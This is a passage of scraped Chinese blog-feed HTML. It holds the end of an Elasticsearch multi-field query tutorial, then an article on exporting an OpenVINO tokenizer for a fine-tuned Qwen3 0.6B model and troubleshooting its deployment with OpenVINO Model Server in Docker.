<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43ae7969ed614f55ab7310ae8c02d67f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=jN%2Bc5J%2Bu3Jv0fVSklrpiHRoh8fo%3D" alt="Elasticsearch 查询" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">多字段支持</span>
POST /lagou-property/_search
{
  "query": {
    "query_string" : {
      "query":"2699",
      "fields": [ "title","price"]
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cca1973dc5b8497ca1c0f928cf019d4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=RbrK1UiUPj5%2BJs2VQtIz3I2CPT4%3D" alt="Elasticsearch 查询结果" loading="lazy"/></p>
<h3 data-id="heading-8">多字段匹配查询（multi match query）</h3>
<p>如果你需要在多个字段上进行文本搜索，可用multi_match，multi_match在match的基础上支持对多个字段进行文本查询。</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">multi_match 是 match查询的一种扩展方式，用于在多个字段上进行查询</span>
POST /wzk-property/_search
{
  "query": {
    "multi_match" : {
      "query":"小米4A",
      "fields": [ "title","images"]
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dc0771c871c4adcaefa9db9047c02b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=8j4yZq6DHAYibfYsbwesCLmWjs8%3D" alt="Elasticsearch 多字段匹配" loading="lazy"/></p>
<h2 data-id="heading-9">错误速查</h2>















































<table><thead><tr><th>症状</th><th>根因</th><th>定位</th><th>修复</th></tr></thead><tbody><tr><td>用 match 查询“小米电视4A”，结果把“小米手机”也查出来</td><td>match 默认 operator=OR，中文分词后任意一个词命中即算匹配</td><td>在 Kibana 中使用 _analyze 查看 title 分词结果，确认分词粒度</td><td>在 match 中显式设置 "operator": "and"，或改用 keyword/精确匹配字段承载商品名</td></tr><tr><td>match_phrase 查不到预期文档（如“电视小米”“小米4A”均无结果）</td><td>match_phrase 要求分词顺序与位置连续，默认不允许跳词</td><td>用 _analyze 查看短语分词顺序，对比 _source.title 的实际分词顺序</td><td>使用 "slop": N 放宽位置约束，或改写查询短语与文案保持一致</td></tr><tr><td>query_string 报解析错误或查不到数据</td><td>query_string 语法较复杂，逻辑运算符、特殊字符未转义，或 default_field 不含目标内容</td><td>查看 Kibana 报错信息，逐步简化 query 字符串，只保留单词验证</td><td>避免直接透传用户输入，必要时对 `+ - &amp;&amp;</td></tr><tr><td>使用 query_string 模糊查询“小米~1”但结果过多或过少</td><td>模糊匹配基于编辑距离，且受 analyzer 影响，并非“看起来相似就一定命中”</td><td>对同一单词分别用 _analyze 和 query_string 测试，观察实际命中词条</td><td>明确业务接受的模糊程度，合理设置 ~1/~2，必要时改为前缀/通配符或拼音索引等更明确方案</td></tr><tr><td>multi_match 跨字段查询命中不符合预期</td><td>多字段中字段类型和分词方式不同，score 被某个字段主导，导致排序或命中偏移</td><td>查看 mapping 中各字段的 type/analyzer，并用单字段 match 对比效果</td><td>在 multi_match 中显式配置 fields 权重（如 "title^3"），或统一文本字段的 analyzer，避免 keyword 与 text 混用产生误解</td></tr><tr><td>match_all 能查到文档，但任一全文查询都查不到</td><td>字段被映射为 keyword 或未被索引，全文查询打在错误字段上</td><td>用 mapping 接口确认字段 type 及 index 属性，检查查询 JSON 中的字段名拼写</td><td>将字段改为 text 或设置合适的多字段（text + keyword），并校正 DSL 中的字段名，重建索引后再次验证</td></tr></tbody></table>
<h2 data-id="heading-10">其他系列</h2>
<h3 data-id="heading-11">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-132 Java 生态前沿 2025：Spring、Quarkus、GraalVM、CRaC 与云原生落地</strong></p>
<h3 data-id="heading-12">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-180 Java 接入 FastDFS：自编译客户端与 Maven/Spring Boot 实战</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 已完结，OSS正在更新... 深入浅出助你打牢基础！</p>
<h3 data-id="heading-13">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【从零开始】19. 模型实测与验证]]></title>    <link>https://juejin.cn/post/7579893536105840646</link>    <guid>https://juejin.cn/post/7579893536105840646</guid>    <pubDate>2025-12-05T03:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579893536105840646" data-draft-id="7579846221168230454" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【从零开始】19. 模型实测与验证"/> <meta itemprop="keywords" content="人工智能,LLM"/> <meta itemprop="datePublished" content="2025-12-05T03:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Kida的躺平小屋"/> <meta itemprop="url" content="https://juejin.cn/user/1684864740889758"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【从零开始】19. 模型实测与验证
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1684864740889758/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Kida的躺平小屋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:22:43.000Z" title="Fri Dec 05 2025 03:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在真正开讲之前需要补充一下“16. 基于 CPU 的转换、量化实现”和“18. 持续优化模型微调”中遗漏的信息。</p>
<h4 data-id="heading-0">“基于 CPU 的转换、量化实现”内容补充</h4>
<p>在这章我通过 Python 导出基于 OpenVINO 的 IR 模型后并没有将对应的 tokenizer 导出。这会导致调用 apply_chat_template 进行推理时出现以下报错：</p>
<pre><code class="hljs language-bash" lang="bash">[2025-11-25 11:20:07,191]_apply_template - Template application failed, using raw string: Check <span class="hljs-string">'!chat_tpl.empty()'</span> failed at ../../../../src/cpp/src/tokenizer/tokenizer.cpp:655:
Chat template wasn<span class="hljs-string">'t found. This may indicate that the model wasn'</span>t trained <span class="hljs-keyword">for</span> chat scenario. Please add <span class="hljs-string">'chat_template'</span> to tokenizer_config.json to use the model <span class="hljs-keyword">in</span> chat scenario. For more information see the section Troubleshooting <span class="hljs-keyword">in</span> README.md
</code></pre>
<p>为此，这里补上 export_tokenizer 函数用于导出 tokenizer 配置。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_tokenizer</span>(<span class="hljs-params">self</span>):
    <span class="hljs-comment"># 导入 openvino_tokenizers</span>
    <span class="hljs-keyword">from</span> openvino_tokenizers <span class="hljs-keyword">import</span> convert_tokenizer
    <span class="hljs-comment"># 导入 openvino</span>
    <span class="hljs-keyword">from</span> openvino <span class="hljs-keyword">import</span> save_model

    <span class="hljs-comment"># 使用 huggingface 模式加载量化后的 tokenizer</span>
    hf_tokenizer = AutoTokenizer.from_pretrained(
        self.unsloth_merge_model_dir,
        trust_remote_code=<span class="hljs-literal">True</span>
    )

    <span class="hljs-comment"># 对 tokenizer 进行转换</span>
    ov_tokenizer, ov_detokenizer = convert_tokenizer(hf_tokenizer, with_detokenizer=<span class="hljs-literal">True</span>)

    <span class="hljs-comment"># 导出基于 ov 的 tokenizer 和 detokenizer </span>
    save_model(ov_tokenizer, os.path.join(self.openvino_int4_model_dir,<span class="hljs-string">"openvino_tokenizer.xml"</span>))
    save_model(ov_detokenizer, os.path.join(self.openvino_int4_model_dir,<span class="hljs-string">"openvino_detokenizer.xml"</span>))
</code></pre>
<p><strong>这里我们不能直接使用 Huggingface 的 tokenizer_config.json</strong>（虽然上面报错说 tokenizer_config.json 中找不到 ‘chat_template’ 参数）。事实上由于我们使用的是 OpenVINO 方案，因此需要对 Huggingface 的 hf_tokenizer 后进行进一步的转换（ convert_tokenizer -&gt; save_model）后方可使用。</p>
<p>我们可以将 export_tokenizer 追加到 start_to_export 函数末尾即可：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_to_export</span>(<span class="hljs-params">self</span>):

    ...

    <span class="hljs-keyword">try</span>:
        self.export_tokenizer()
    <span class="hljs-keyword">except</span> Exception:
        logger.error(<span class="hljs-string">"FATAL: Tokenizer export failed. Cannot proceed with openvino-genai."</span>)
        sys.exit(<span class="hljs-number">5</span>)

    logger.info(<span class="hljs-string">"Done."</span>)
</code></pre>
<h4 data-id="heading-1">“持续优化模型微调”内容补充</h4>
<p>其实 <strong>1.2287</strong> 并不是我的最终答案。后来我趁放假补充了训练数据量后又做了三次调优。最终模型得分（Loss）定格在 <strong>0.8698</strong>。超参数组合如下：</p>
<pre><code class="hljs language-bash" lang="bash">训练数据：678915
最终得分 (Loss): 0.8698
验证集损失 (Eval Loss): 0.8698
训练集损失 (Train Loss): 0.8652
最优超参数组合：
{
  <span class="hljs-string">"learning_rate"</span>: <span class="hljs-string">"2e-4"</span>,
  <span class="hljs-string">"max_steps"</span>: 7500,
  <span class="hljs-string">"r"</span>: 256,
  <span class="hljs-string">"lora_alpha"</span>: 512,
  <span class="hljs-string">"per_device_train_batch_size"</span>: 32,
  <span class="hljs-string">"gradient_accumulation_steps"</span>: 8,
  <span class="hljs-string">"max_seq_length"</span>: 8192
}
</code></pre>
<p>经复盘发现继续微调下去意义不是很大，毕竟基于现有的资源（硬件资源和数据资源）不会有太大的性能提升，因此后面将以这个作为基线开展工作（除非接下来的“问答验证”环节中评估分数太低，这时就需要调整数据精度并重新训练）。</p>
<hr/>
<p>好啦，书接上回。上一章节我们已经做完模型的持续调优了，接下来就需要将模型导出部署并进行“问答验证”。</p>
<p>看过我博客的小伙伴都知道，之前我尝试过 Optimum Intel 套件直接驱动 Qwen1.5 7B 的 GGUF 模型（属于实验性质），在单用户提问时响应速度还算可以，但准确率嘛就有点“吓人”了。除了幻觉严重外，自控能力还非常有限（无限输出）。但毕竟是低版本模型嘛，可以理解...可以理解。</p>
<p>这次我带着微调后的 Qwen3 0.6B 模型又来挑战了，除了使用垂直领域知识进行微调外，在 OpenVINO 驱动上相较于之前做了大量的改进。同样在自己的 MBP 上进行验证，希望能有个好结果吧。</p>
<h3 data-id="heading-2">1.OpenVINO Model Server（OVMS）与思维链</h3>
<p>由于 Qwen3 模型是带有思维链模式的，看了一遍 OpenVINO 的官方文档，目前只有 OpenVINO Model Server (OVMS) 提供 --reasoning_parser 参数用于思考链推理，而且也只支持 qwen3。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7a1fdc4a1e948a59faa95e58c56c402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=7NQ90PxFwu5LbI0rgH%2Be2e66nA4%3D" alt="" loading="lazy"/></p>
<p>OVMS 目前只支持 Linux 和 Windows 平台，我大 Mac 只能选择 Docker 解决方案。</p>
<p>事不宜迟，Checkout 最新镜像（openvino/model_server:latest）后启动 OVMS 服务。</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
-p 8000:8000 \
-p 9000:9000 \
-v &lt;int4_path&gt;/models:/models \
openvino/model_server:latest \
--model_path /models/model1 \
--model_name Qwen3-0.6R \
--reasoning_parser qwen3 \
--rest_port 8000 \
--port 9000 
</code></pre>
<p>使用以上命令启动后得到输出</p>
<pre><code class="hljs language-bash" lang="bash">2025-11-28 14:50:36 error parsing options - unmatched arguments: --reasoning_parser, qwen3, 
</code></pre>
<p>What？</p>
<p>不是说 reasoning_parser 参数可以用的吗？之后我又尝试将 reasoning_parser 放入环境变量。虽说没有报错了，但思考链没有生效。既然解决不了就先放下，于是得到以下命令：</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
-p 8000:8000 \
-p 9000:9000 \
-v &lt;int4_path&gt;/models:/models \
openvino/model_server:latest \
--model_path /models/model1 \
--model_name Qwen3-0.6R \
--rest_port 8000 \
--port 9000 
</code></pre>
<p>这里需要着重说明的是，参数里挂载目录传参和 model_path 参数之间的关系。首先 OVMS 使用的模型一定要是 IR 模型（我猜的，毕竟我只有 IR 模型运行成功了），因此 &lt;int4_path&gt; 要填写量化后导出的 int4 模型路径。但为什么后面要有一个 models 呢？这是为了配合 model_path 参数使用的需要。目录结构如下：</p>
<pre><code class="hljs language-bash" lang="bash">OpenVINOModel
└── INT4
    └── models
        └── model1
            └── 1
                ├── config.json
                ├── generation_config.json
                ├── openvino_config.json
                ├── openvino_detokenizer.bin
                ├── openvino_detokenizer.xml
                ├── openvino_model.bin
                ├── openvino_model.xml
                ├── openvino_tokenizer.bin
                └── openvino_tokenizer.xml
</code></pre>
<p>由于 OVMS 启动时会扫描 model_path 路径下的目录（/models/model1），其中 /models 是固定项，这个属于挂载点。下一级目录 model1 可以是任意的名字，但再下级就需要一个名为 1 的文件夹。这个 1 代表的是模型的版本（version），如果缺失了这个目录，就会一直报找不到版本（No version found for model in path）。</p>
<p>而 docker 命令中 model_name 是为了调用时有一个明确的 model 指向，因此为了不与 0.6B 混淆，这里就重命名为 0.6R。</p>
<p>至此，docker 的 OVMS 应该就能启动成功了（docker logs 看一下就知道了）。</p>
<p>在浏览器输入地址 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8000%2Fv1%2Fconfig" target="_blank" title="http://localhost:8000/v1/config" ref="nofollow noopener noreferrer">http://localhost:8000/v1/config</a> 就能够查看模型加载效果</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"Qwen3-0.6R"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"model_version_status"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AVAILABLE"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"error_code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OK"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"error_message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OK"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>好了，服务部署好了就尝试推理吧。</p>
<p>写一个 Python 脚本试试多轮对话：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

base_url=<span class="hljs-string">"http://localhost:8000/v3/chat/completions"</span>
headers = {
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
}
payload = {
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"Qwen3-0.6R"</span>,
    <span class="hljs-string">"stream"</span>: <span class="hljs-literal">False</span>,
    <span class="hljs-string">"messages"</span>: [
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是一名专业的中医药知识问答质量评估员。"</span>},
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"请详细分析一下中医理论中'阴阳'的概念，并给出思考过程。"</span>}
    ]
}

response = requests.request(<span class="hljs-string">"POST"</span>, base_url, json=payload, headers=headers)
<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    results = json.loads(response.text)[<span class="hljs-string">"results"</span>]
    <span class="hljs-built_in">print</span>(results)
</code></pre>
<p>返回的结果如下：</p>
<pre><code class="hljs language-python" lang="python">openvino Error code: <span class="hljs-number">404</span> - {<span class="hljs-string">'error'</span>: <span class="hljs-string">'Mediapipe graph definition with requested name is not found'</span>}
</code></pre>
<p>对此官方文档给出提示</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cf7be6e5bb842b991bc32c81e68e04c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=1L5slmeAnI%2BbRyvtn4in4jIV%2FXU%3D" alt="" loading="lazy"/></p>
<p>是的，我明白还需要 graph.pbtxt 这个文件了。但是我的 IR 导出并没有将 graph.pbtxt 生成出来。</p>
<p>那么 graph.pbtxt 我要在哪里才能够找到呢？经过一番寻找最终在 Github 的某一个 Issus 中找到了答案。</p>
<p>需要先访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server.git" target="_blank" title="https://github.com/openvinotoolkit/model_server.git" ref="nofollow noopener noreferrer">github.com/openvinotoo…</a> 项目中找到 demos -&gt; continuous_batching -&gt; graph.pbtxt。找到 graph.pbtxt 后下载并拷贝到 &lt;int4_path&gt;/models/model1/1 目录下跟 int4 量化模型放在一起就可以了。如下图：</p>
<pre><code class="hljs language-python" lang="python">OpenVINOModel
└── INT4
    └── models
        └── model1
            └── <span class="hljs-number">1</span>
                ├── config.json
                ├── graph.pbtxt
                ├── generation_config.json
                ├── openvino_config.json
                ├── openvino_detokenizer.<span class="hljs-built_in">bin</span>
                ├── openvino_detokenizer.xml
                ├── openvino_model.<span class="hljs-built_in">bin</span>
                ├── openvino_model.xml
                ├── openvino_tokenizer.<span class="hljs-built_in">bin</span>
                └── openvino_tokenizer.xml
</code></pre>
<p>就这样 OVMS 启动时就能扫描到了。</p>
<p>好了，现在再试试调用吧。结果...</p>
<pre><code class="hljs language-bash" lang="bash">Mediapipe execution failed. MP status - INVALID_ARGUMENT: CalculatorGraph::Run() failed: \\nCalculator::Process() <span class="hljs-keyword">for</span> node \\"LLMExecutor\\" failed: This servable accepts only single message requests
</code></pre>
<p>What？This servable accepts only single message requests？不是吧，只支持单次推理？（这里有点搞不懂了，可能是我的 graph.pbtxt 有问题吧，因为之后我尝试过直接用 Optimum Intel 驱动导出的 IR 模型是可以多轮问答的）</p>
<p>OK，就目前这种情况其实就能放弃这个方案了，但为了追求真相我们还是换成单次推理试试：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

base_url=<span class="hljs-string">"http://localhost:8000/v3/completions"</span>
headers = {
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
}
payload = {
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"Qwen3-0.6R"</span>,
    <span class="hljs-string">"stream"</span>: <span class="hljs-literal">False</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"你是一名专业的中医药知识问答质量评估员。请详细分析一下中医理论中'阴阳'的概念，并给出思考过程。"</span>
}

response = requests.request(<span class="hljs-string">"POST"</span>, base_url, json=payload, headers=headers)
<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    results = json.loads(response.text)[<span class="hljs-string">"results"</span>]
    <span class="hljs-built_in">print</span>(results)
</code></pre>
<p>这次 OVMS 确实接收到请求了，但是... CPU 一直拉升并且超长时间内没有响应，如下图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8e57e8180b44742a832a4bcc4e69972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=Q%2BogKWzrq4o9e%2FG3ECuIpDR6jX0%3D" alt="" loading="lazy"/></p>
<p>之后足足等了 6 分钟还是没有输出。这台 Mac 的 CPU 分配给 docker 的拢共就只能走 400%，等待的时间内一直被占满，最后实在没有办法了就中断了启动试验。</p>
<pre><code class="hljs language-bash" lang="bash">2025-11-28 13:47:30 [2025-11-28 05:47:30.483][84][llm_executor][info][llm_executor.hpp:66] All requests: 1; Scheduled requests: 1; Cache usage 0.1%;
...
2025-11-28 13:53:53 [2025-11-28 05:53:53.597][84][llm_executor][info][llm_executor.hpp:66] All requests: 1; Scheduled requests: 1; Cache usage 4.2%;
</code></pre>
<p>也许是我的配置有问题，也可能是我的硬件设备已经不支持这套方案了...也许这套方案在其他硬件或者配置下会有所改善，但就我目前的情况来看是走不通的。</p>
<h3 data-id="heading-3">2.OpenVINO GenAI 推理</h3>
<h4 data-id="heading-4">2.1 OVMS 导出模型</h4>
<p>既然 OVMS 走不通，那么我们就选择另一种推理方式 GenAI。</p>
<p>为什么选择 GenAI？这就要说说它与 Optimum Intel 之间的区别。</p>
<p>简单来说，Optimum Intel 更适合从 Huggingface 生态平滑迁移的开发者，而 GenAI 则提供了更高性能、更低依赖的本地化部署选择。</p>
<p>之前之所以使用 Optimum Intel 是因为那时刚刚接触模型开发，在接触 OpenVINO 之前就已经写好了本地基于 Huggingface 的 Qwen1.5 推理底座了。为了能够平滑过度到 CPU 驱动的高性能方案才使用的 Optimum Intel。但这次我们是以性能有限，因此重新选择了对 C++ 更为友好的 GenAI 解决方案。</p>
<p>此外，还有一个原因是后续我有可能会自己开发一个具有边缘推理能力的 APP，这时候 GenAI 就派上用场了（毕竟依赖极少，轻量化且有完整的文本生成流水线，这些对于边缘算力来说是非常重要的）。</p>
<p>ε=(´ο｀*)))唉扯远了，回归主题。</p>
